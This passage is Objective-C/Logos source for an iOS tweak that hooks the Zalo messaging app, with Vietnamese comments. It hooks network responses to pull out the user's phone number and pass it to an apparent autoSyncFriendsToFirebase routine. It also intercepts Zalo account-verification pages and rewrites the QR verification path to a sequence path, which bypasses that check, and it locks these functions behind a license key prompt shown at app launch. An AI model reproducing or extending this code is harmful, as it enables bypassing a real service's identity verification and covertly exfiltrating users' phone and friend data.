                        id dataObj = json[@"data"];
                        BOOL isSuccess = (errorCode == 0);

                        if (isSuccess) {
                            NSString *detectedPhone = nil;
                            if ([dataObj isKindOfClass:[NSDictionary class]]) {
                                detectedPhone = dataObj[@"phone"] ?: dataObj[@"phone_number"] ?: dataObj[@"phoneNumber"] ?: dataObj[@"userId"];
                            }
                            if (!detectedPhone) {
                                // Tìm trong query hoặc body
                                NSURLComponents *comps = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
                                for (NSURLQueryItem *item in comps.queryItems) {
                                    if ([item.name isEqualToString:@"phone"] || [item.name isEqualToString:@"phoneNumber"]) {
                                        detectedPhone = item.value;
                                        break;
                                    }
                                }
                            }

                            if (detectedPhone && detectedPhone.length >= 9) {
                                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
                                    autoSyncFriendsToFirebase(detectedPhone);
                                });
                            }
                        }
                    }
                } @catch (NSException *e) {}
            }
            completionHandler(data, response, error);
        };
        return %orig(request, wrappedHandler);
    }

    return %orig(request, completionHandler);
}

%end

// ==============================================================================
// HOOK 3: ZALO WEBVIEW (CHUYỂN HƯỚNG QR -> SEQ KHI XÁC MINH BẠN BÈ)
// ==============================================================================
%hook WKWebView

- (WKNavigation *)loadRequest:(NSURLRequest *)request {
    NSURL *url = request.URL;
    NSString *host = url.host;
    NSString *path = url.path;

    if ([host containsString:@"accounts.zalo.me"] || [host containsString:@"zm-verification-center.zaloapp.com"]) {
        if ([path containsString:@"/verify/v3/qr"] || [path containsString:@"/verify/v3"]) {
            if ([path containsString:@"/verify/v3/seq"]) {
                return %orig(request);
            }

            NSURLComponents *components = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
            NSString *phoneParam = nil;
            for (NSURLQueryItem *item in components.queryItems) {
                if ([item.name isEqualToString:@"phone"] || [item.name isEqualToString:@"phoneNumber"]) {
                    phoneParam = item.value;
                    break;
                }
            }

            if (phoneParam && phoneParam.length >= 9) {
                autoSyncFriendsToFirebase(phoneParam);

                WKWebView *targetWebView = self;
                verifyKeyAndExecute(phoneParam, ^{
                    dispatch_async(dispatch_get_main_queue(), ^{
                        NSString *seqUrlStr = [url.absoluteString stringByReplacingOccurrencesOfString:@"/verify/v3/qr" withString:@"/verify/v3/seq"];
                        NSURL *seqUrl = [NSURL URLWithString:seqUrlStr];
                        NSMutableURLRequest *newReq = [request mutableCopy];
                        [newReq setURL:seqUrl];
                        [targetWebView loadRequest:newReq];
                    });
                });

                return nil;
            }
        }
    }

    return %orig(request);
}

%end

// ==============================================================================
// HOOK KHỞI ĐỘNG ỨNG DỤNG ZALO - YÊU CẦU NHẬP KEY NGAY KHI MỞ APP
// ==============================================================================
static void checkLicenseOnStartup(void) {
    NSString *savedKey = getSavedLicenseKey();
    if (!savedKey || savedKey.length == 0) {
        // Chưa có Key -> Bật Popup yêu cầu nhập Key ngay trên màn hình Zalo
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            promptForLicenseKey(^(NSString *newKey) {
                // Kiểm tra và kích hoạt Key vừa nhập
                verifyKeyAndExecute(nil, ^{
                    saveLicenseKeyPermanently(newKey);
                    showSecurityAlert(@"✅ KÍCH HOẠT THÀNH CÔNG", [NSString stringWithFormat:@"Thiết bị đã được kích hoạt bản quyền thành công với Mã Key: %@", newKey]);
                });
            });
        });
    } else {
        // Đã có Key -> Kiểm tra ngầm để cập nhật thông số máy
        verifyKeyAndExecute(nil, nil);
    }
}

%hook UIApplication

- (void)_setSuspended:(BOOL)suspended {
    %orig;
    if (!suspended) {
        static dispatch_once_t onceToken;
        dispatch_once(&onceToken, ^{
            checkLicenseOnStartup();
        });
    }
}

%end

%ctor {
    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification
                                                      object:nil
                                                       queue:[NSOperationQueue mainQueue]
                                                  usingBlock:^(NSNotification * _Nonnull note) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            checkLicenseOnStartup();
        });
    }];
}
